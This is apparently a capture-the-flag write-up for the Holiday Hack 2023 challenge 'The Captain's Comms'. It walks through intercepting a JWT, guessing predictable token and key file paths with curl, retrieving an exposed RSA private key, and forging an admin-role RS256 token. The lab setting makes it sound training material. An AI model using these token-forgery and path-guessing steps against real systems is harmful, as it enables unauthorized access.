# OBJECTIVE 18 - The Captain's Comms  


## OBJECTIVE  
Speak with Chimney Scissorsticks on Steampunk Island about the captain's new Software Defined Radio (SDR) and assume the **GeeseIslandsSuperChiefCommunicationsOfficer** role to transmit critical data.

## Hints

<details>
  <summary>Hints provided for Objective 18</summary>

- The captain abbreviates filenames (1–4 letter words).
- Use web interception tools like Burp or ZAP.
- JWTs play a major role—learn more from [Auth0’s guide](https://auth0.com/docs/secure/tokens/json-web-tokens).
- The captain’s journal hints he’s been to Pixel Island.
- Find a private key, update an existing JWT!
</details>

---

## My Approach

This challenge focused heavily on **JWT manipulation**, **authorization bypass**, and **file enumeration** through poor security hygiene.

---

### Step 1: Intercept the Bearer Token

Using **Burp Suite**, I intercepted a request and captured the JWT found in the `Authorization` header:

```
Authorization: Bearer eyJhbG...
```

---

### Step 2: Access the First JWT Token (`radioMonitor`)

Based on clues from the **Owner's Card**, I tried accessing a known token location:

```bash
curl https://captainscomms.com/jwtDefault/rMonitor.tok -H "Authorization: Bearer <captured-token>"
```

Decoded on [jwt.io](https://jwt.io), the payload contained:

```json
{
  "role": "radioMonitor"
}
```

Setting this token as the `justWatchThisCookie` allowed access to the **SDR Waterfall Display** — but not the decoding features.

---

### Step 3: Guess the Next Token (`radioDecoder`)

Guessing the next logical filename based on the captain's naming habits:

```bash
curl https://captainscomms.com/jwtDefault/rDecoder.tok -H "Authorization: Bearer <captured-token>"
```

Success — we retrieved the `radioDecoder` token and updated the `justWatchThisCookie` again.

Now the SDR interface showed **three decoded transmissions**:

---

### Signal Transmissions:

#### Morse Code:
```
CQ CQ CQ DE KH644 – SILLY CAPTAIN! WE FOUND HIS FANCY RADIO PRIVATE KEY IN A FOLDER CALLED TH3CAPSPR1V4T3F0LD3R...
```



#### Voice Numbers Station:
```
88323 88323 88323 ... 12249 12249 16009 16009 ...
```

---

### Step 4: Retrieve the Captain’s Keys

Clues pointed to a `keys` directory. I accessed the **public key**:

```bash
curl https://captainscomms.com/jwtDefault/keys/capsPubKey.key -H "Authorization: Bearer <token>"
```

Then used info from the Morse transmission (`TH3CAPSPR1V4T3F0LD3R`) to grab the **private key**:

```bash
curl https://captainscomms.com/jwtDefault/keys/TH3CAPSPR1V4T3F0LD3R/capsPrivKey.key -H "Authorization: Bearer <token>"
```

We now had both the public and private RSA keys.

---

### Step 5: Forge the Admin JWT

Using [jwt.io](https://jwt.io), I crafted a new JWT using the private key and this payload:

```json
{
  "iss": "HHC 2023 Captain's Comms",
  "iat": 1699485795,
  "exp": 1809937395,
  "aud": "Holiday Hack 2023",
  "role": "GeeseIslandsSuperChiefCommunicationsOfficer"
}
```

Signed it with `RS256` and replaced the `justWatchThisCookie` with the new token.

---

### Step 6: Transmit the Signal

The **RadioFax** and **Voice** transmissions gave us the needed frequency and time:

- Frequency: `10426Hz`
- Date: `12/24`
- Time: `16:00`  
  → adjusted **4 hours earlier**, as instructed: **12:00**

So I submitted:

```
Freq: 10426Hz / Date: 1224 / Time: 1200
```

Challenge complete 🎉


---

## Result

I successfully gained unauthorized access to the admin role by abusing poor JWT key storage and predictable file naming. This allowed me to control the radio transmitter and complete the mission.

---

## Lessons Learned

This challenge reinforced how critical secure key storage is. Exposing private keys and poorly scoped tokens makes JWT-based systems trivial to exploit. Always secure tokens, use minimal roles, and avoid predictable file paths — or your comms will get hijacked by elves.
